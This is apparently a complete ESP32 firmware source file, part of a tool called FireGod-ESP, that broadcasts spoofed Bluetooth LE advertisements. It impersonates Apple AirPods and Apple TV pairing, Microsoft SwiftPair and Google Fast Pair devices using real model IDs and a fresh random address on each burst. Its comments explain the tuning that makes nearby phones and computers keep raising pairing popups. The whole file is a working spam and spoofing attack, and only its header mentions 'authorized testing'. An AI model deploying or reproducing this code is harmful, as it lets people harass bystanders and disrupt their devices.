// ============================================================
// FireGod-ESP — BLE Advertisement Spam
//
// Rapidly cycles non-connectable advertising payloads that imitate
// Apple Continuity proximity-pairing, Microsoft SwiftPair, and Android
// Fast Pair, each with a fresh random static address so targets treat
// every burst as a new nearby device. Runs beside the WiFi SoftAP via
// software coexistence; the dashboard stays up. Authorized testing only.
// ============================================================

#include "ble_spam.h"
#include "fg_globals.h"
#include <NimBLEDevice.h>
#include <esp_random.h>

// --- random helpers ---
static inline uint8_t rb() { return (uint8_t)(esp_random() & 0xff); }

// Apple proximity-pairing device model codes that trigger setup popups.
static const uint16_t APPLE_MODELS[] = {
    0x0E20, // AirPods Pro
    0x0A20, // AirPods Max
    0x0220, // AirPods
    0x0055, // Apple TV setup
    0x0030, // Apple TV pair
    0x0B20, // PowerBeats Pro
};
static const int APPLE_N = sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]);

// Build one Apple proximity-pairing manufacturer AD (31 bytes total).
static size_t build_apple(uint8_t* b) {
    uint16_t model = APPLE_MODELS[esp_random() % APPLE_N];
    size_t i = 0;
    b[i++] = 0x1e;             // AD length (30 bytes follow)
    b[i++] = 0xff;             // manufacturer specific
    b[i++] = 0x4c; b[i++] = 0x00;   // Apple, Inc.
    b[i++] = 0x07;             // proximity pairing
    b[i++] = 0x19;             // payload length
    b[i++] = 0x07;             // type
    b[i++] = (uint8_t)(model >> 8);
    b[i++] = (uint8_t)(model & 0xff);
    b[i++] = 0x55;             // status
    while (i < 31) b[i++] = rb();    // fill remainder with random
    return i;
}

// Build a Microsoft SwiftPair AD (flags + manufacturer w/ random display name).
static size_t build_microsoft(uint8_t* b) {
    static const char alnum[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    uint8_t nameLen = 6 + (esp_random() % 6);   // 6..11 chars
    size_t i = 0;
    b[i++] = 0x02; b[i++] = 0x01; b[i++] = 0x06;        // flags
    b[i++] = (uint8_t)(6 + nameLen);                    // AD length
    b[i++] = 0xff;                                       // manufacturer specific
    b[i++] = 0x06; b[i++] = 0x00;                        // Microsoft
    b[i++] = 0x03; b[i++] = 0x00; b[i++] = 0x80;         // beacon, reserved, flags
    for (uint8_t n = 0; n < nameLen; n++) b[i++] = alnum[esp_random() % 36];
    return i;
}

// Registered Google Fast Pair model IDs. A RANDOM id is not in Google's device
// database, so the phone silently ignores it — these are real, known-popping IDs
// (subset of the list used by Bruce/ESP32 BLE-spam tools).
static const uint32_t FASTPAIR_MODELS[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x00000B, 0x00000D, 0x000007,
    0x090000, 0x000048, 0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4,
    0xF00002, 0xF00400, 0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66,
    0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7,
    0x038B91, 0x02F637, 0x02D886,
};
static const int FASTPAIR_N = sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]);

// Build an Android Fast Pair AD (flags + 0xFE2C service UUID + model service data + tx power).
static size_t build_android(uint8_t* b) {
    uint32_t model = FASTPAIR_MODELS[esp_random() % FASTPAIR_N];
    size_t i = 0;
    b[i++] = 0x02; b[i++] = 0x01; b[i++] = 0x06;             // flags
    b[i++] = 0x03; b[i++] = 0x03; b[i++] = 0x2c; b[i++] = 0xfe;  // 16-bit svc UUID FE2C
    b[i++] = 0x06; b[i++] = 0x16; b[i++] = 0x2c; b[i++] = 0xfe;  // svc data FE2C
    b[i++] = (uint8_t)(model >> 16);                        // 3-byte registered model id
    b[i++] = (uint8_t)(model >> 8);
    b[i++] = (uint8_t)(model & 0xff);
    b[i++] = 0x02; b[i++] = 0x0a; b[i++] = (uint8_t)(esp_random() & 0x7f);  // tx power field
    return i;
}

void fg_ble_spam(uint8_t mode) {
    static const char* names[] = {"all", "apple", "microsoft", "android"};
    if (mode > 3) mode = 0;

    fg_send_result_fmt("{\"event\":\"log\",\"msg\":\"BLE spam (%s) starting...\"}",
                       names[mode]);
    Serial.printf("[BLE] Spam mode=%s\n", names[mode]);

    NimBLEDevice::init("");
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    // Proximity-pair popups only fire on NON-connectable adverts. NimBLE
    // defaults advertising to connectable-undirected, which the targets ignore
    // (the broadcast is visible to scanners but triggers nothing). conn_mode and
    // the interval live in m_advParams, so set them once here, not per burst.
    adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);

    uint8_t buf[31];
    uint32_t sent = 0, lastEmit = millis();
    uint8_t pick = (mode == 0) ? 1 : mode;   // for cycle-all we rotate 1..3

    while (!g_stopRequested) {
        adv->stop();

        // Fresh random static address each cycle (top two bits set = static random).
        uint8_t rnd[6];
        for (int k = 0; k < 6; k++) rnd[k] = rb();
        rnd[5] |= 0xc0;
        NimBLEDevice::setOwnAddr(rnd);

        size_t len;
        uint8_t use = (mode == 0) ? pick : mode;
        if (use == 1)      len = build_apple(buf);
        else if (use == 2) len = build_microsoft(buf);
        else               len = build_android(buf);
        if (mode == 0 && ++pick > 3) pick = 1;

        NimBLEAdvertisementData ad;
        ad.addData(buf, len);   // raw pre-framed AD structures; addData appends verbatim
        adv->setAdvertisementData(ad);
        adv->start();
        sent++;

        // Dwell on this identity before rotating. Apple/SwiftPair re-pop on each
        // NEW address, so churn fast. Fast Pair is the opposite: Android must scan
        // the SAME address+model long enough to look the model up with Google and
        // raise the notification, so hold it ~1s. The controller keeps re-emitting
        // at the 20ms interval on its own during the dwell — no restart needed.
        uint32_t dwell = (use == 3) ? 1000 : 40;
        for (uint32_t waited = 0; waited < dwell && !g_stopRequested; waited += 40)
            vTaskDelay(pdMS_TO_TICKS(40));

        uint32_t now = millis();
        if (now - lastEmit >= 1000) {
            lastEmit = now;
            fg_send_result_fmt(
                "{\"event\":\"spam_stats\",\"type\":\"ble\",\"sent\":%lu,\"mode\":\"%s\"}",
                (unsigned long)sent, names[mode]);
        }
    }

    adv->stop();
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);   // restore so next module is clean
    NimBLEDevice::deinit(true);

    fg_send_result_fmt("{\"event\":\"scan_complete\",\"type\":\"ble_spam\",\"count\":%lu}",
                       (unsigned long)sent);
    Serial.printf("[BLE] Spam stopped. %lu adverts.\n", (unsigned long)sent);
}
